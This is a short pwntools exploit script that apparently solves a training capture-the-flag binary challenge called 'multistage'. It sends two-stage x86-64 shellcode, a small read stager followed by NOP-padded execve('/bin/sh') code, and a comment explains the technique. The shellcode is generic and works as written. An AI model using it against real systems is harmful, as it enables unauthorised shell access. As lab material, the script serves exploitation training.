from pwn import *

SERVER = "bin.training.offdef.it"
PORT = 2003
BINARY = "./multistage"


if "REMOTE" in args:
    r = remote(SERVER, PORT)
else: 
    r = process(BINARY)
    gdb.attach(r, """
            #breakpoints
            b* 0x0040123f
            c
            """)
    input("wait")


#code
r.send(b'\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC2\xFF\x00\x00\x00\x0F\x05')
r.send(b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x89\xF7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x48\x83\xC7\x28\x0F\x05/bin/sh\x00')
r.interactive()


#comment
'''
The problem in this challenge was that the read was too short. There was no way to fit a proper 
shellcode for executing bin/sh. So, what you have to do (if there is enough space in memory)
is to make another read "unlocking" the number of bytes readable. 

mov    rsi,rax
xor    rax,rax
xor    rdi,rdi
mov    rdx,0xff
syscall

this is a shell code che sets a read of 0xff byets (255)

when it finishes the read, the instruction pointer will jump directly to the address
next to \x05 (final byte of the syscall), so the second read has to get the same amout
of bytes and later the code for the execv with the right bytes for the jump (this is the reason
of the nop operation \x90)

mov    rdi,rsi
xor    rsi,rsi
xor    rdx,rdx
mov    rax,0x3b
add    rdi,0x28
syscall

and then bin/sh (this is the execv op after the nops)

'''